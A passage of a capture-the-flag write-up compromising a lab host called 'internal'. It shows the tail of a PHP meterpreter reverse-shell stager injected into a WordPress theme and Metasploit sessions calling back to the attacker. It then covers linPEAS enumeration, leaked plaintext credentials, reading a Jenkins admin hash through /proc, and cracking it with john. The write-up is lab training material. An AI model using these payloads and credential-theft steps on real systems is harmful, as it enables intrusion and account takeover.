style=color:#f92672>(</span>$b<span style=color:#f92672>))</span>; break; <span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;socket&#39;</span>: $b .<span style=color:#f92672>=</span> socket_read<span style=color:#f92672>(</span>$s, $len-strlen<span style=color:#f92672>(</span>$b<span style=color:#f92672>))</span>; break; <span style=color:#f92672>}</span> <span style=color:#f92672>}</span> $GLOBALS<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;msgsock&#39;</span><span style=color:#f92672>]</span> <span style=color:#f92672>=</span> $s; $GLOBALS<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;msgsock_type&#39;</span><span style=color:#f92672>]</span> <span style=color:#f92672>=</span> $s_type; <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>extension_loaded<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;suhosin&#39;</span><span style=color:#f92672>)</span> <span style=color:#f92672>&amp;&amp;</span> ini_get<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;suhosin.executor.disable_eval&#39;</span><span style=color:#f92672>))</span> <span style=color:#f92672>{</span> $suhosin_bypass<span style=color:#f92672>=</span>create_function<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;&#39;</span>, $b<span style=color:#f92672>)</span>; $suhosin_bypass<span style=color:#f92672>()</span>; <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#f92672>{</span> eval<span style=color:#f92672>(</span>$b<span style=color:#f92672>)</span>; <span style=color:#f92672>}</span> die<span style=color:#f92672>()</span>;
</span></span></code></pre></div><p><p class=markdown-image><img src=/static/img/internal_http_wp_shell_injection.png alt="wordpress template injection"></p></p><p>Prior to saving the theme, I prepped a listener in using the <code>exploit/multi/handler</code> module in metasploit to catch the new meterpreter session.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; set payload php/meterpreter/reverse_tcp
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span>&gt; php/meterpreter/reverse_tcp
</span></span><span style=display:flex><span>msf5 exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; run -j
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Exploit running as background job 3.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Exploit completed, but no session was created.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Started reverse TCP handler on 10.10.253.137:4444
</span></span></code></pre></div><p>I then refreshed the site index and prepared the <code>multi/manage/shell_to_meterpreter</code> module to migrate the incoming shell to a new process not attached to the php session.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 post<span style=color:#f92672>(</span>multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span> &gt; 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Sending stage <span style=color:#f92672>(</span><span style=color:#ae81ff>38288</span> bytes<span style=color:#f92672>)</span> to 10.10.215.86
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Meterpreter session <span style=color:#ae81ff>1</span> opened <span style=color:#f92672>(</span>10.10.253.137:4444 -&gt; 10.10.215.86:58660<span style=color:#f92672>)</span> at 2020-12-05 05:33:03 +0000
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>msf5 post<span style=color:#f92672>(</span>multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span> &gt; set session <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>session <span style=color:#f92672>=</span>&gt; <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>msf5 post<span style=color:#f92672>(</span>multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span> &gt; run
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> SESSION may not be compatible with this module.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Upgrading session ID: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Starting exploit/multi/handler
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Started reverse TCP handler on 10.10.253.137:4433 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Sending stage <span style=color:#f92672>(</span><span style=color:#ae81ff>980808</span> bytes<span style=color:#f92672>)</span> to 10.10.215.86
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Meterpreter session <span style=color:#ae81ff>2</span> opened <span style=color:#f92672>(</span>10.10.253.137:4433 -&gt; 10.10.215.86:55326<span style=color:#f92672>)</span> at 2020-12-05 05:33:23 +0000
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Command stager progress: 100.00% <span style=color:#f92672>(</span>773/773 bytes<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Post module execution completed
</span></span><span style=display:flex><span>msf5 post<span style=color:#f92672>(</span>multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span> &gt; sessions 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Active sessions
</span></span><span style=display:flex><span><span style=color:#f92672>===============</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  Id  Name  Type                   Information                                                           Connection
</span></span><span style=display:flex><span>  --  ----  ----                   -----------                                                           ----------
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>1</span>         meterpreter php/linux  www-data <span style=color:#f92672>(</span>33<span style=color:#f92672>)</span> @ internal                                              10.10.253.137:4444 -&gt; 10.10.215.86:58660 <span style=color:#f92672>(</span>10.10.215.86<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>2</span>         meterpreter x86/linux  no-user @ internal <span style=color:#f92672>(</span>uid<span style=color:#f92672>=</span>33, gid<span style=color:#f92672>=</span>33, euid<span style=color:#f92672>=</span>33, egid<span style=color:#f92672>=</span>33<span style=color:#f92672>)</span> @ 10.10.215.86  10.10.253.137:4433 -&gt; 10.10.215.86:55326 <span style=color:#f92672>(</span>10.10.215.86<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>Once this completed I killed the original session, and replaced the site index with it&rsquo;s original template, returning the site to its normal appearance.</p><h3 id=enumerating-the-local-user>Enumerating the local user <a href=#enumerating-the-local-user class=anchor>üîó</a></h3><p>Now that I had a shell, I started by running <code>linPEAS</code> to gain an initial impression of what else was running on the host.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 post<span style=color:#f92672>(</span>multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span> &gt; use <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Starting interaction with 2...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>meterpreter &gt; getuid 
</span></span><span style=display:flex><span>Server username: no-user @ internal <span style=color:#f92672>(</span>uid<span style=color:#f92672>=</span>33, gid<span style=color:#f92672>=</span>33, euid<span style=color:#f92672>=</span>33, egid<span style=color:#f92672>=</span>33<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>meterpreter &gt; cd /tmp/
</span></span><span style=display:flex><span>meterpreter &gt; upload /root/Desktop/PEASS/linPEAS/linpeas.sh
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> uploading  : /root/Desktop/PEASS/linPEAS/linpeas.sh -&gt; linpeas.sh
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Uploaded -1.00 B of 217.36 KiB <span style=color:#f92672>(</span>-0.0%<span style=color:#f92672>)</span>: /root/Desktop/PEASS/linPEAS/linpeas.sh -&gt; linpeas.sh
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> uploaded   : /root/Desktop/PEASS/linPEAS/linpeas.sh -&gt; linpeas.sh
</span></span><span style=display:flex><span>meterpreter &gt; shell 
</span></span><span style=display:flex><span>Process <span style=color:#ae81ff>6521</span> created.
</span></span><span style=display:flex><span>Channel <span style=color:#ae81ff>3</span> created.
</span></span><span style=display:flex><span>chmod +x linpeas.sh
</span></span><span style=display:flex><span>./linpeas.sh &gt; internal_local_enum.txt
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>meterpreter &gt; download internal_local_enum.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Downloading: internal_local_enum.txt -&gt; /root/ctf/internal_local_enum.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Downloaded 124.65 KiB of 124.65 KiB <span style=color:#f92672>(</span>100.0%<span style=color:#f92672>)</span>: internal_local_enum.txt -&gt; /root/ctf//internal_local_enum.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> download   : internal_local_enum.txt -&gt; /root/ctf//internal_local_enum.txt
</span></span></code></pre></div><p>I combed through the results and found that the host contained an additional unprivileged users with a shell, <code>aubreanna</code>, appeared to be running <code>docker</code>, appeared to be running a significant number of locally bound services and finally that the host appeared to be running jenkins as the <code>aubreanna</code> user with the assumption being that one of these locally bound services was the jenkins portal.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>====================================( System Information )====================================
</span></span><span style=display:flex><span>[+] Operative system
</span></span><span style=display:flex><span>[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
</span></span><span style=display:flex><span>Linux version 4.15.0-112-generic (buildd@lcy01-amd64-027) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020
</span></span><span style=display:flex><span>Distributor ID: Ubuntu
</span></span><span style=display:flex><span>Description:    Ubuntu 18.04.4 LTS
</span></span><span style=display:flex><span>Release:        18.04
</span></span><span style=display:flex><span>Codename:       bionic
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>[+] Users with console
</span></span><span style=display:flex><span>aubreanna:x:1000:1000:aubreanna:/home/aubreanna:/bin/bash
</span></span><span style=display:flex><span>root:x:0:0:root:/root:/bin/bash
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>[+] Active Ports
</span></span><span style=display:flex><span>[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports
</span></span><span style=display:flex><span>Active Internet connections (servers and established)
</span></span><span style=display:flex><span>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
</span></span><span style=display:flex><span>tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
</span></span><span style=display:flex><span>tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
</span></span><span style=display:flex><span>tcp        0      0 127.0.0.1:44849         0.0.0.0:*               LISTEN      -                   
</span></span><span style=display:flex><span>tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
</span></span><span style=display:flex><span>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
</span></span><span style=display:flex><span>tcp        0      0 10.10.215.86:58660      10.10.253.137:4444      ESTABLISHED 6511/TOJWR          
</span></span><span style=display:flex><span>tcp        0      0 10.10.215.86:55326      10.10.253.137:4433      ESTABLISHED 6511/TOJWR          
</span></span><span style=display:flex><span>tcp6       0      0 :::80                   :::*                    LISTEN      -                   
</span></span><span style=display:flex><span>tcp6       0      0 :::22                   :::*                    LISTEN      -                   
</span></span><span style=display:flex><span>tcp6       0      0 10.10.215.86:80         10.10.253.137:44196     ESTABLISHED -                   
</span></span><span style=display:flex><span>tcp6       0      0 10.10.215.86:80         10.10.253.137:44286     TIME_WAIT   -                   
</span></span><span style=display:flex><span>udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
</span></span><span style=display:flex><span>udp        0      0 10.10.215.86:68         0.0.0.0:*                           - 
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>docker0: flags<span style=color:#f92672>=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span style=color:#ae81ff>1500</span>
</span></span><span style=display:flex><span>        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
</span></span><span style=display:flex><span>        inet6 fe80::42:d6ff:fe0f:a70e  prefixlen <span style=color:#ae81ff>64</span>  scopeid 0x20&lt;link&gt;
</span></span><span style=display:flex><span>        ether 02:42:d6:0f:a7:0e  txqueuelen <span style=color:#ae81ff>0</span>  <span style=color:#f92672>(</span>Ethernet<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        RX packets <span style=color:#ae81ff>8</span>  bytes <span style=color:#ae81ff>420</span> <span style=color:#f92672>(</span>420.0 B<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        RX errors <span style=color:#ae81ff>0</span>  dropped <span style=color:#ae81ff>0</span>  overruns <span style=color:#ae81ff>0</span>  frame <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>        TX packets <span style=color:#ae81ff>19</span>  bytes <span style=color:#ae81ff>1416</span> <span style=color:#f92672>(</span>1.4 KB<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        TX errors <span style=color:#ae81ff>0</span>  dropped <span style=color:#ae81ff>0</span> overruns <span style=color:#ae81ff>0</span>  carrier <span style=color:#ae81ff>0</span>  collisions <span style=color:#ae81ff>0</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>================================(</span> Processes, Cron, Services, Timers &amp; Sockets <span style=color:#f92672>)================================</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Cleaned processes
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>i<span style=color:#f92672>]</span> Check weird &amp; unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
</span></span><span style=display:flex><span>USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
</span></span><span style=display:flex><span>aubrean+  <span style=color:#ae81ff>1506</span>  0.0  0.0   <span style=color:#ae81ff>1148</span>     <span style=color:#ae81ff>4</span> ?        Ss   04:08   0:00 /sbin/tini -- /usr/local/bin/jenkins.sh
</span></span><span style=display:flex><span>aubrean+  <span style=color:#ae81ff>1540</span>  0.5 12.1 <span style=color:#ae81ff>2587808</span> <span style=color:#ae81ff>248012</span> ?      Sl   04:08   0:27 java -Duser.home<span style=color:#f92672>=</span>/var/jenkins_home -Djenkins.model.Jenkins.slaveAgentPort<span style=color:#f92672>=</span><span style=color:#ae81ff>50000</span> -jar /usr/share/jenkins/jenkins.war  0.0  0.1  <span style=color:#ae81ff>28332</span>  <span style=color:#ae81ff>2344</span> ?        Ss   04:08   0:00 /usr/sbin/atd -f
</span></span><span style=display:flex><span>message+   <span style=color:#ae81ff>909</span>  0.0  0.2  <span style=color:#ae81ff>50060</span>  <span style=color:#ae81ff>4664</span> ?        Ss   04:08   0:00 /usr/bin/dbus-daemon --system --address<span style=color:#f92672>=</span>systemd: --nofork --nopidfile --systemd-activation --syslog-onlyql     <span style=color:#ae81ff>1099</span>  0.2 11.2 <span style=color:#ae81ff>1165848</span> <span style=color:#ae81ff>229308</span> ?      Sl   04:08   0:14 /usr/sbin/mysqld --daemonize --pid-file<span style=color:#f92672>=</span>/run/mysqld/mysqld.pid
</span></span></code></pre></div><p>I decided to take a look in the <code>/var/jenkins_home/</code> directory to see if I could find any configuration for the jenkins host but found that it didn&rsquo;t exist, leading me to believe it running in a docker container. Similarly, I looked under <code>/etc/</code> and found nothing related to jenkins, finally I looked under <code>/opt/</code> and stumbled on a <code>/opt/wp-save.txt</code> file that netted a set of credentialls for the <code>aubreanna</code> user.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>meterpreter &gt; cd /opt
</span></span><span style=display:flex><span>meterpreter &gt; ls
</span></span><span style=display:flex><span>Listing: /opt
</span></span><span style=display:flex><span><span style=color:#f92672>=============</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Mode              Size  Type  Last modified              Name
</span></span><span style=display:flex><span>----              ----  ----  -------------              ----
</span></span><span style=display:flex><span>40711/rwx--x--x   <span style=color:#ae81ff>4096</span>  dir   2020-08-03 03:01:12 +0000  containerd
</span></span><span style=display:flex><span>100644/rw-r--r--  <span style=color:#ae81ff>138</span>   fil   2020-08-03 02:46:25 +0000  wp-save.txt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>meterpreter &gt; cat wp-save.txt
</span></span><span style=display:flex><span>Bill,
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Aubreanna needed these credentials <span style=color:#66d9ef>for</span> something later.  Let her know you have them and where they are.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>aubreanna:bubb13guM!@#123
</span></span><span style=display:flex><span>meterpreter &gt;
</span></span></code></pre></div><p>I attempted to login with the provided credentials via ssh and was pleased to receive a shell that quickly netted the user flag, confirmed that jenkins was running in docker and provided me a host/port pairing in the docker bridge network&rsquo;s subnet.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf# ssh aubreanna@10.10.215.86
</span></span><span style=display:flex><span>The authenticity of host <span style=color:#e6db74>&#39;10.10.215.86 (10.10.215.86)&#39;</span> can<span style=color:#e6db74>&#39;t be established.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>ECDSA key fingerprint is SHA256:fJ/BlTrDF8wS8/eqyoej1aq/NmvQh79ABdkpiiN5tqE.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Warning: Permanently added &#39;</span>10.10.215.86<span style=color:#e6db74>&#39; (ECDSA) to the list of known hosts.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>aubreanna@10.10.215.86&#39;</span>s password: 
</span></span><span style=display:flex><span>Welcome to Ubuntu 18.04.4 LTS <span style=color:#f92672>(</span>GNU/Linux 4.15.0-112-generic x86_64<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> * Documentation:  https://help.ubuntu.com
</span></span><span style=display:flex><span> * Management:     https://landscape.canonical.com
</span></span><span style=display:flex><span> * Support:        https://ubuntu.com/advantage
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  System information as of Sat Dec  <span style=color:#ae81ff>5</span> 05:44:35 UTC <span style=color:#ae81ff>2020</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  System load:  0.1               Processes:              <span style=color:#ae81ff>113</span>
</span></span><span style=display:flex><span>  Usage of /:   64.0% of 8.79GB   Users logged in:        <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>  Memory usage: 48%               IP address <span style=color:#66d9ef>for</span> eth0:    10.10.215.86
</span></span><span style=display:flex><span>  Swap usage:   0%                IP address <span style=color:#66d9ef>for</span> docker0: 172.17.0.1
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>=</span>&gt; There is <span style=color:#ae81ff>1</span> zombie process.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> * Canonical Livepatch is available <span style=color:#66d9ef>for</span> installation.
</span></span><span style=display:flex><span>   - Reduce system reboots and improve kernel security. Activate at:
</span></span><span style=display:flex><span>     https://ubuntu.com/livepatch
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span> packages can be updated.
</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span> updates are security updates.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Last login: Mon Aug  <span style=color:#ae81ff>3</span> 19:56:19 <span style=color:#ae81ff>2020</span> from 10.6.2.56
</span></span><span style=display:flex><span>aubreanna@internal:~$ ls
</span></span><span style=display:flex><span>jenkins.txt  snap  user.txt
</span></span><span style=display:flex><span>aubreanna@internal:~$ cat jenkins.txt 
</span></span><span style=display:flex><span>Internal Jenkins service is running on 172.17.0.2:8080
</span></span></code></pre></div><h3 id=connecting-to-jenkins>Connecting to jenkins <a href=#connecting-to-jenkins class=anchor>üîó</a></h3><p>Prior to starting enumeration of the aubreanna user, I decided to setup ssh port-forwarding so that I could easily connect back to the jenkins host that was bound to <code>127.0.0.1:8080</code>. Due to an already running conflict with burp, I bound it to port <code>8888</code> locally.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf# ssh -L 8888:127.0.0.1:8080 -N -f aubreanna@10.10.215.86
</span></span><span style=display:flex><span>aubreanna@10.10.215.86<span style=color:#960050;background-color:#1e0010>&#39;</span>s password:
</span></span></code></pre></div><p><p class=markdown-image><img src=/static/img/internal_http_jenkins_login.png alt="jenkins login"></p></p><h3 id=enumerating-the-aubreanna-user>Enumerating the aubreanna user <a href=#enumerating-the-aubreanna-user class=anchor>üîó</a></h3><p>I, again, uploaded linPEAS to the <code>aubreanna</code> users home directory and reran the scan to see if anything else turned up.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf# sftp aubreanna@10.10.215.86
</span></span><span style=display:flex><span>aubreanna@10.10.215.86<span style=color:#e6db74>&#39;s password: 
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Permission denied, please try again.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>aubreanna@10.10.215.86&#39;</span>s password: 
</span></span><span style=display:flex><span>Connected to 10.10.215.86.
</span></span><span style=display:flex><span>sftp&gt; put /root/Desktop/PEASS/linPEAS/linpeas.sh 
</span></span><span style=display:flex><span>Uploading /root/Desktop/PEASS/linPEAS/linpeas.sh to /home/aubreanna/linpeas.sh
</span></span><span style=display:flex><span>/root/Desktop/PEASS/linPEAS/linpeas.sh
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aubreanna@internal:~$ ./linpeas.sh &gt; aubreanna_local_enum.txt
</span></span></code></pre></div><p>But upon further inspection found that it confirmed a lot of information that I had already known. However, I remembered that the jenkins container was running under the same uid as aubreanna and I decided to see if I could access any of the filesystem through <code>/proc</code>. I attempted to navigate to the jenkins process and found that I was able to access the root of the of the namespace where I was quickly able to leak the jenkins admin credentials.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aubreanna@internal:/proc/1506/root$ ls
</span></span><span style=display:flex><span>bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
</span></span><span style=display:flex><span>aubreanna@internal:/proc/1506/root$ cd var/
</span></span><span style=display:flex><span>aubreanna@internal:/proc/1506/root/var$ ls
</span></span><span style=display:flex><span>backups  cache  jenkins_home  lib  local  lock  log  mail  opt  run  spool  tmp
</span></span><span style=display:flex><span>aubreanna@internal:/proc/1506/root/var$ cd jenkins_home/
</span></span><span style=display:flex><span>aubreanna@internal:/proc/1506/root/var/jenkins_home$ ls
</span></span><span style=display:flex><span>com.cloudbees.hudson.plugins.folder.config.AbstractFolderConfiguration.xml  identity.key.enc                                jobs              queue.xml.bak             updates
</span></span><span style=display:flex><span>config.xml                                                                  jenkins.install.InstallUtil.lastExecVersion     logs              secret.key                userContent
</span></span><span style=display:flex><span>copy_reference_file.log                                                     jenkins.install.UpgradeWizard.state             nodeMonitors.xml  secret.key.not-so-secret  users
</span></span><span style=display:flex><span>hudson.model.UpdateCenter.xml                                               jenkins.model.JenkinsLocationConfiguration.xml  nodes             secrets                   war
</span></span><span style=display:flex><span>hudson.plugins.git.GitTool.xml                                              jenkins.telemetry.Correlator.xml                plugins           tini_pub.gpg              workflow-libs
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aubreanna@internal:/proc/1506/root/var/jenkins_home/users$ cat admin_3190494404640478712/config.xml | grep <span style=color:#e6db74>&#39;&lt;id&gt;&#39;</span>
</span></span><span style=display:flex><span>  &lt;id&gt;admin&lt;/id&gt;
</span></span><span style=display:flex><span>aubreanna@internal:/proc/1506/root/var/jenkins_home/users$ cat admin_3190494404640478712/config.xml | grep <span style=color:#e6db74>&#39;hudson.security.HudsonPrivateSecurityRealm_-Details&#39;</span> -A1
</span></span><span style=display:flex><span>    &lt;hudson.security.HudsonPrivateSecurityRealm_-Details&gt;
</span></span><span style=display:flex><span>      &lt;passwordHash&gt;#jbcrypt:$2a$10$MDKawySp3DRfUrrKFrBAe.o2D4qCzIJJaPpRfc3u2CR/w.NzbJjqe&lt;/passwordHash&gt;
</span></span><span style=display:flex><span>    &lt;/hudson.security.HudsonPrivateSecurityRealm_-Details&gt;
</span></span><span style=display:flex><span>    &lt;org.jenkinsci.main.modules.cli.auth.ssh.UserPropertyImpl&gt;
</span></span></code></pre></div><h3 id=cracking-the-jenkins-admin-credentials>Cracking the Jenkins admin credentials <a href=#cracking-the-jenkins-admin-credentials class=anchor>üîó</a></h3><p>I pulled the bcrypt hash from above and fed it into <code>john</code>, again running it against the <code>rockyou.txt</code> wordlist. Almost instantaneously it returned a collision for the password <code>spongebob</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf# echo <span style=color:#e6db74>&#39;admin:$2a$10$MDKawySp3DRfUrrKFrBAe.o2D4qCzIJJaPpRfc3u2CR/w.NzbJjqe&#39;</span> &gt; jenkins_admin.txt
</span></span><span style=display:flex><span>root@kali:~/ctf# john jenkins_admin.txt --wordlist<span style=color:#f92672>=</span>/usr/share/wordlists/rockyou.txt
</span></span><span style=display:flex><span>Created directory: /root/.john
</span></span><span style=display:flex><span>Using default input encoding: UTF-8
</span></span><span style=display:flex><span>Loaded <span style=color:#ae81ff>1</span> password hash <span style=color:#f92672>(</span>bcrypt <span style=color:#f92672>[</span>Blowfish 32/64 X3<span style=color:#f92672>])</span>
</span></span><span style=display:flex><span>Cost <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>iteration count<span style=color:#f92672>)</span> is <span style=color:#ae81ff>1024</span> <span style=color:#66d9ef>for</span> all loaded hashes
</span></span><span style=display:flex><span>Will run <span style=color:#ae81ff>2</span> OpenMP threads
</span></span><span style=display:flex><span>Press <span style=color:#e6db74>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style=color:#66d9ef>for</span> status
</span></span><span style=display:flex><span>spongebob        <span style=color:#f92672>(</span>admin<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>1g 0:00:00:01 DONE <span style=color:#f92672>(</span>2020-12-05 06:07<span style=color:#f92672>)</span> 0.6172g/s 66.66p/s 66.66c/s 66.66C/s spongebob..beautiful
</span></span><span style=display:flex><span>Use the <span style=color:#e6db74>&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span><span style=display:flex><span>Session completed
